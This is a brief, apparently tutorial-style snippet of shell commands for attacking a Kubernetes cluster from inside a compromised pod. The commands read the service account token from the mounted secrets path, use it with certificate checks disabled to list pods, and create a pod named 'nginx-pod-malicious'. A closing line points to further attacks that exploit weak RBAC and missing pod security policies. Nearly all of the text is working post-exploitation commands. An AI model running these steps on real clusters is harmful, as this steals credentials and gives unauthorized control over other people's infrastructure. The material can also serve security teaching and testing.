env

export TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token)

curl -s https://$KUBERNETES_SERVICE_HOST/api/v1/namespaces/default/pods -XGET -H "Authorization: Bearer $TOKEN" -H "Content-Type: application
/json" --insecure

curl -s https://$KUBERNETES_SERVICE_HOST/api/v1/namespaces/default/pods -XPOST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" --insecure --data '{
 "apiVersion":"v1",
 "kind":"Pod",
 "metadata":{
  "name":"nginx-pod-malicious"
 },
 "spec":{
  "containers":[
   {
    "name":"ngnix",
    "image":"nginx:1.7.9","ports":[
      {
        "containerPort": 80
       }
    ]
   }
  ]
 }
}'

You can think of more complex attack on kubernetes platform based on insecure configuration like insecure RBAC and no PodSecurity policy.
